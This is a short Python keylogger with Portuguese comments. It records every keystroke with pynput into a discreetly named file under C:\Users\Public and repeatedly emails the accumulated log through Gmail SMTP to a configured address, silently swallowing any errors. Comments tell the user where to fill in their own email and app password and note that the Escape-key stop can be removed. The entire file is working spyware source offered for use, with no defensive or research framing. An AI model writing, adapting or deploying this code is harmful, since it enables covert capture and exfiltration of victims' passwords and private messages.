from pynput import keyboard
import time
import smtplib
from email.mime.text import MIMEText

log_file = "C:\\Users\\Public\\Documents\\system_log.txt"  # Caminho discreto (Windows)

def send_email(log_content):

    sender = "teuemail"  # Coloque teu e-mail aqui
    receiver = "demailqépraenviar"  # Pode ser o mesmo ou outro e-mail
    password = "senhadeapp"  # Coloque tua senha de app do Gmail aqui

    msg = MIMEText(log_content)
    msg["Subject"] = "Relatório do Keylogger"
    msg["From"] = sender
    msg["To"] = receiver

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender, password)
            server.sendmail(sender, receiver, msg.as_string())
    except Exception:
        pass

def write_to_file(key):
    key_map = {
        keyboard.Key.space: "[ESPAÇO]",
        keyboard.Key.enter: "[ENTER]",
        keyboard.Key.backspace: "[BACKSPACE]",
        keyboard.Key.tab: "[TAB]",
        keyboard.Key.shift: "[SHIFT]",
        keyboard.Key.ctrl: "[CTRL]",
        keyboard.Key.alt: "[ALT]",
        keyboard.Key.esc: "[ESC]"
    }
    key_str = key_map.get(key, str(key))
    timestamp = time.strftime("%H:%M:%S")
    log_entry = f"[{timestamp}] {key_str} "
    
    with open(log_file, "a") as file:
        file.write(log_entry)
    
    with open(log_file, "r") as file:
        lines = file.readlines()
        if len(lines) % 10 == 0:
            send_email("".join(lines))

def on_press(key):
    try:
        write_to_file(key.char)
    except AttributeError:
        write_to_file(key)

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Pra teste, remove se quiser que não pare

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()